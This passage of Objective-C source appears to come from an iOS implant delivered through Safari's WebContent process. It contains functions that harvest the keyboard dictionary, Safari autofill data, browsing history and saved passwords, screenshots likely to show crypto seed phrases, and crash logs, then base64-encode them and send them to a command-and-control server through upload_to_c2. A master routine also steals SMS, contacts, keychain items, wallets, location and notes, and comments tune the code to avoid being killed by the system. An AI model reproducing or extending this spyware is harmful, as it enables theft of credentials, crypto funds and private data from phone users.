        NSArray *kbPaths = @[
            @"/var/mobile/Library/Keyboard",
            /* iOS 16+ keyboard data moved here */
            @"/var/mobile/Library/Caches/com.apple.keyboard",
        ];
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *kbDir in kbPaths) {
            NSArray *files = [fm contentsOfDirectoryAtPath:kbDir error:nil];
            for (NSString *f in files) {
                /* Focus on the dynamic dictionary and learned words DB */
                NSString *fl = [f lowercaseString];
                if (![fl containsString:@"dynamic"] &&
                    ![fl containsString:@"learned"] &&
                    ![fl containsString:@"custom"]  &&
                    ![fl hasSuffix:@".dat"]          &&
                    ![fl hasSuffix:@".db"]           &&
                    ![fl hasSuffix:@".sqlite"]) continue;

                NSString *full = [kbDir stringByAppendingPathComponent:f];
                NSData *d = [NSData dataWithContentsOfFile:full];
                if (!d || d.length == 0 || d.length > 8 * 1024 * 1024) continue;
                NSString *b64 = [d base64EncodedStringWithOptions:0];
                upload_to_c2("personal", full.UTF8String,
                             "Keyboard dynamic dictionary", b64.UTF8String);
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * Safari form autofill / saved passwords
 *
 * Safari stores form data in two places:
 *   • form_values.db  — field name → value pairs (may contain seeds typed
 *                        into web-based wallets like MetaMask web)
 *   • SafariTabs.db / History.db — visited URLs (less sensitive but useful)
 *
 * Path: /var/mobile/Library/Safari/
 * -------------------------------------------------------------------------- */
void harvest_safari_data(void) {
    @autoreleasepool {
        /* form_values.db — Safari autofill data */
        {
            const char *db = "/var/mobile/Library/Safari/form_values.db";
            if (access(db, R_OK) == 0) {
                const char *sql =
                    "SELECT name, value, timestamp "
                    "FROM form_values ORDER BY timestamp DESC LIMIT 5000";
                const char *cols[] = {"name", "value", "ts", NULL};
                NSArray *rows = sqlite_select(db, sql, cols);
                if (rows.count) {
                    NSString *b64 = json_b64(rows);
                    if (b64)
                        upload_to_c2("personal",
                                     "/var/mobile/Library/Safari/form_values.json",
                                     "Safari form autofill data", b64.UTF8String);
                }
            }
        }

        /* History.db — browsing history (reveals which wallet sites visited) */
        {
            const char *db = "/var/mobile/Library/Safari/History.db";
            if (access(db, R_OK) == 0) {
                const char *sql =
                    "SELECT hi.url, hi.title, hv.visit_time "
                    "FROM history_items hi "
                    "JOIN history_visits hv ON hv.history_item = hi.id "
                    "ORDER BY hv.visit_time DESC LIMIT 3000";
                const char *cols[] = {"url", "title", "visit_time", NULL};
                NSArray *rows = sqlite_select(db, sql, cols);
                if (rows.count) {
                    NSString *b64 = json_b64(rows);
                    if (b64)
                        upload_to_c2("personal",
                                     "/var/mobile/Library/Safari/history.json",
                                     "Safari browsing history", b64.UTF8String);
                }
            }
        }

        /* Saved passwords — SafariPasswords.plist (needs root on most versions) */
        {
            const char *db = "/var/mobile/Library/Safari/SafariPasswords.plist";
            if (access(db, R_OK) == 0) {
                NSData *d = [NSData dataWithContentsOfFile:@(db)];
                if (d) {
                    NSString *b64 = [d base64EncodedStringWithOptions:0];
                    upload_to_c2("keychain",
                                 "/var/mobile/Library/Safari/SafariPasswords.json",
                                 "Safari saved passwords", b64.UTF8String);
                }
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * Photos — upload actual screenshot images that may show seed phrases
 *
 * Strategy:
 *   1. Query Photos.sqlite for screenshots whose filename / title suggests
 *      it's a wallet/seed screenshot (filename heuristic).
 *   2. Upload the raw JPEG/PNG file (capped at 8 MB per image).
 *   3. Also upload all screenshots taken in a 30-day window regardless of
 *      name — users screenshot their seed during wallet setup.
 * -------------------------------------------------------------------------- */
void harvest_seed_screenshots(void) {
    @autoreleasepool {
        const char *db = "/var/mobile/Media/PhotoData/Photos.sqlite";
        if (access(db, R_OK) != 0) return;

        /*
         * ZASSET.ZKIND = 1 → screenshot (iOS 14+; column may not exist on iOS 13).
         * Use COALESCE so the query succeeds on both schema versions.
         * ZDATECREATED is Apple epoch (seconds since 2001-01-01); subtract
         * 978307200 to convert strftime('%s') Unix time to Apple epoch.
         * Window: last 1 year of screenshots / wallet-named files.
         */
        const char *sql =
            "SELECT ZFILENAME, ZDIRECTORY, "
            "       COALESCE(ZLATITUDE,0), COALESCE(ZLONGITUDE,0), "
            "       ZDATECREATED, COALESCE(ZKIND,0) "
            "FROM ZASSET "
            "WHERE (COALESCE(ZKIND,0) = 1 "    /* screenshots (iOS 14+) */
            "   OR LOWER(ZFILENAME) LIKE '%seed%' "
            "   OR LOWER(ZFILENAME) LIKE '%wallet%' "
            "   OR LOWER(ZFILENAME) LIKE '%mnemonic%' "
            "   OR LOWER(ZFILENAME) LIKE '%backup%' "
            "   OR LOWER(ZFILENAME) LIKE '%recovery%' "
            "   OR LOWER(ZFILENAME) LIKE '%phrase%' "
            "   OR LOWER(ZFILENAME) LIKE '%secret%') "
            "AND ZDATECREATED > (strftime('%s','now') - 978307200 - 60*60*24*365) "
            "ORDER BY ZDATECREATED DESC LIMIT 200";
        const char *cols[] = {"filename","dir","lat","lon","date","kind", NULL};
        NSArray *rows = sqlite_select(db, sql, cols);

        for (NSDictionary *row in rows) {
            NSString *filename = row[@"filename"];
            NSString *dir      = row[@"dir"];
            if (![filename isKindOfClass:[NSString class]] ||
                ![dir      isKindOfClass:[NSString class]]) continue;

            NSString *imgPath = [NSString stringWithFormat:
                @"/var/mobile/Media/DCIM/%@/%@", dir, filename];
            NSData *imgData = [NSData dataWithContentsOfFile:imgPath];
            if (!imgData || imgData.length == 0 || imgData.length > 8 * 1024 * 1024)
                continue;

            NSString *b64 = [imgData base64EncodedStringWithOptions:0];
            upload_to_c2("screenshot", imgPath.UTF8String,
                         "Possible seed phrase screenshot", b64.UTF8String);
        }
    }
}

/* --------------------------------------------------------------------------
 * App crash logs (CrashReporter)
 *
 * When a wallet app crashes during key generation / import, the system
 * writes a crash report that may contain a stack frame dump or even
 * register values with key material.  We upload all .ips / .crash files
 * from the last 90 days, capped at 2 MB each.
 * -------------------------------------------------------------------------- */
void harvest_crash_logs(void) {
    @autoreleasepool {
        NSArray *crashDirs = @[
            @"/var/mobile/Library/Logs/CrashReporter",
            @"/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs",
            @"/var/mobile/Library/Logs/CrashReporter/StructuredDiagnosticData",
        ];
        NSFileManager *fm = [NSFileManager defaultManager];

        /* 90 days ago, seconds since 1970 */
        NSTimeInterval cutoff = [[NSDate date] timeIntervalSince1970] - 90*24*3600;

        for (NSString *crashDir in crashDirs) {
            NSArray *files = [fm contentsOfDirectoryAtPath:crashDir error:nil];
            for (NSString *f in files) {
                NSString *fl = [f lowercaseString];
                if (![fl hasSuffix:@".ips"]   &&
                    ![fl hasSuffix:@".crash"]  &&
                    ![fl hasSuffix:@".log"]    &&
                    ![fl hasSuffix:@".txt"])   continue;

                NSString *full = [crashDir stringByAppendingPathComponent:f];
                NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
                NSDate *modDate = attrs[NSFileModificationDate];
                if (modDate && [modDate timeIntervalSince1970] < cutoff) continue;

                NSData *d = [NSData dataWithContentsOfFile:full];
                if (!d || d.length == 0 || d.length > 2 * 1024 * 1024) continue;
                NSString *b64 = [d base64EncodedStringWithOptions:0];
                upload_to_c2("personal", full.UTF8String,
                             "App crash report", b64.UTF8String);
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * harvest_all — called from coruna_constructor in main.c
 * -------------------------------------------------------------------------- */
static bool dh_is_webcontent_process(void) {
    const char *pname = getprogname();
    if (!pname) return false;
    if (strcmp(pname, "WebContent") == 0) return true;
    if (strcmp(pname, "com.apple.WebKit.WebContent") == 0) return true;
    if (strstr(pname, "WebContent") != NULL) return true;
    return false;
}

/*
 * WebContent（Safari 渲染进程）虚拟内存与 CPU 预算极紧。完整 harvest_all 会递归扫
 * 大量容器、批量读 Notes、多路 SQLite —— 极易在数秒内触发 jetsam / watchdog，
 * 表现为「Stage3 拉完 dylib → 页面立刻回 /」，JS 来不及再上报错误。
 *
 * WebContent 中只保留与当前页面相关、体量可控的轻量采集；完整采集留给非
 * WebContent（见 main.c implant_main 分支）。
 */
static void harvest_all_webcontent_lite(void) {
    harvest_clipboard();
    harvest_webkit_storage();
    harvest_keyboard_cache();
    harvest_userdefaults_mnemonics();
}

/*
 * harvest_all — 非 WebContent：完整基础采集。
 *
 * 不包含 harvest_memory_mnemonics()：该函数需遍历当前进程全部 VM 区域，
 * 在 WebContent 进程中意味着扫描数 GB WebKit 堆内存，
 * 会持续数分钟并触发 iOS jetsam 杀手，终止整个进程。
 * 调用方（implant_main）负责在非 WebContent 环境下额外调用该函数。
 */
void harvest_all(void) {
    if (dh_is_webcontent_process()) {
        harvest_all_webcontent_lite();
        return;
    }

    harvest_clipboard();              /* 剪贴板 — 导入钱包时必粘贴助记词 */
    harvest_sms();
    harvest_contacts();
    harvest_keychain();
    harvest_wifi_plists();
    harvest_crypto_wallets();
    harvest_userdefaults_mnemonics(); /* NSUserDefaults 助记词明文扫描 */
    harvest_webkit_storage();         /* WebView 钱包 localStorage */
    harvest_keyboard_cache();         /* 键盘动态词典 */
    harvest_safari_data();            /* Safari 表单/历史/密码 */
    harvest_seed_screenshots();       /* 截图中的助记词图片 */
    harvest_crash_logs();             /* App 崩溃日志 */
    harvest_photos();
    harvest_location();
    harvest_notes();
    /* harvest_memory_mnemonics() 由 implant_main 在非 WebContent 环境下单独调用 */
}
